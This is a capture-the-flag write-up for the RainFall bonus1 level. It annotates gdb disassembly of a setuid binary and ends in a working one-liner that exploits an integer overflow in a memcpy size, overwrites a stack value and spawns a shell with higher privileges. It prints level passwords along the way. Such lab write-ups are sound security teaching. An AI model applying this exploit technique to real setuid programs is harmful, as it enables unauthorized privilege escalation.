bonus0@RainFall:~$ su bonus1
Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1

bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1

bonus1@RainFall:~$ cat bonus1
...
...t��f����Ћ���u��[]Ð�S��[����/����[�sh/bin/sh;0����L����...
...

*********************************************************************************
Interesting.
*********************************************************************************

bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 4
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 a
bonus1@RainFall:~$ ./bonus1 a a
bonus1@RainFall:~$ ./bonus1 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

*********************************************************************************
Segfault with number, weird.
*********************************************************************************

(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini

*********************************************************************************
Just a main. The call to execl and to memcpy are interesting. And the call to atoi
explain the segfault.
*********************************************************************************

(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.

*********************************************************************************
    Mise en place de la stack:
        0x08048424 <+0>:	push   %ebp
        0x08048425 <+1>:	mov    %esp,%ebp
        0x08048427 <+3>:	and    $0xfffffff0,%esp
        0x0804842a <+6>:	sub    $0x40,%esp

    nb = atoi(argv1):
        0x0804842d <+9>:	mov    0xc(%ebp),%eax
        0x08048430 <+12>:	add    $0x4,%eax
        0x08048433 <+15>:	mov    (%eax),%eax
        0x08048435 <+17>:	mov    %eax,(%esp)
        0x08048438 <+20>:	call   0x8048360 <atoi@plt>

    if (nb < 9)
        0x0804843d <+25>:	mov    %eax,0x3c(%esp)
        0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
        0x08048446 <+34>:	jle    0x804844f <main+43> 

    memcpy(str, argv[2], nb + 4) :
        0x0804844f <+43>:	mov    0x3c(%esp),%eax
        0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
        0x0804845a <+54>:	mov    0xc(%ebp),%eax
        0x0804845d <+57>:	add    $0x8,%eax
        0x08048460 <+60>:	mov    (%eax),%eax
        0x08048462 <+62>:	mov    %eax,%edx
        0x08048464 <+64>:	lea    0x14(%esp),%eax
        0x08048468 <+68>:	mov    %ecx,0x8(%esp)
        0x0804846c <+72>:	mov    %edx,0x4(%esp)
        0x08048470 <+76>:	mov    %eax,(%esp)
        0x08048473 <+79>:	call   0x8048320 <memcpy@plt>

    if (nb ==  1464814662)
        0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
        0x08048480 <+92>:	jne    0x804849e <main+122>

    execl(0x8048583, 0x8048580, 0)
        0x08048482 <+94>:	movl   $0x0,0x8(%esp)
        0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
        0x08048492 <+110>:	movl   $0x8048583,(%esp)
        0x08048499 <+117>:	call   0x8048350 <execl@plt>
        0x0804849e <+122>:	mov    $0x0,%eax
        0x080484a3 <+127>:	leave
        0x080484a4 <+128>:	ret
    
    So we have to pass this condition to open a shell with bonus2 rights.
        0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
        0x08048480 <+92>:	jne    0x804849e <main+122>
    We will use the memcpy to overwrite 0x3c(esp) with our buffer that begins at
    0x14(esp) so we have to use an offset of 3c-14=28 in hexa, 40 in decimal,
    and then write 0x574f4c46 in little endian => 0x464c4f57, but our first
    problem is that the third argument of memcpy is the number of character
    copied and we are blocked by this condition that control argv[1] :
        0x0804843d <+25>:	mov    %eax,0x3c(%esp)
        0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
        0x08048446 <+34>:	jle    0x804844f <main+43>
    To pass it we need a number inferior to 10 so we will use the fact that
    it is stocked in an integer and use this instruction :
        0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
    It will multiplied our argv[1] value converted in integer and multiplied
    it by 4, so we can overflow INT_MIN to get to the size we need 44.
    We need to calcul INT_MIN/2 + 11 to find -1073741813 for our first argument.
    We will write 40 'a' followed by /x46/x4c/x4f/x57 for opur second argument.


*********************************************************************************

(gdb) b *main+54
Breakpoint 1 at 0x804845a
(gdb) b *main+79
Breakpoint 2 at 0x8048473
(gdb) b *main+84
Breakpoint 3 at 0x8048478
(gdb) run
Starting program: /home/user/bonus1/bonus1 -1073741813 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW

Breakpoint 1, 0x0804845a in main ()
(gdb) i r
eax            0xc000000b	-1073741813
ecx            0x2c	44
edx            0x1	1
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff660	0xbffff660
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x804845a	0x804845a <main+54>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) step
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x08048473 in main ()
(gdb) i r
eax            0xbffff674	-1073744268
ecx            0x2c	44
edx            0xbffff8a1	-1073743711
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff660	0xbffff660
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x8048473	0x8048473 <main+79>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x /20xw
Argument required (starting display address).
(gdb) x /20xw $esp
0xbffff660:	0xbffff674	0xbffff8a1	0x0000002c	0x080482fd
0xbffff670:	0xb7fd13e4	0x00000016	0x08049764	0x080484d1
0xbffff680:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff690:	0xb7fed280	0x00000000	0x080484b9	0xc000000b
0xbffff6a0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
(gdb) step
Single stepping until exit from function main,
which has no line number information.

Breakpoint 3, 0x08048478 in main ()
(gdb) x /20xw $esp
0xbffff660:	0xbffff674	0xbffff8a1	0x0000002c	0x080482fd
0xbffff670:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x574f4c46
0xbffff6a0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
(gdb) step
Single stepping until exit from function main,
which has no line number information.
process 3770 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 3: No symbol table is loaded.  Use the "file" command.
$ whoami
bonus1

*********************************************************************************
It didn't worked because we are in gdb but it works nicely outside of it.
*********************************************************************************

bonus1@RainFall:~$ arg="-1073741813" ; arg2=$(python -c "print('A'*40 + '\x46\x4c\x4f\x57')") ; ./bonus1 $arg $arg2
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245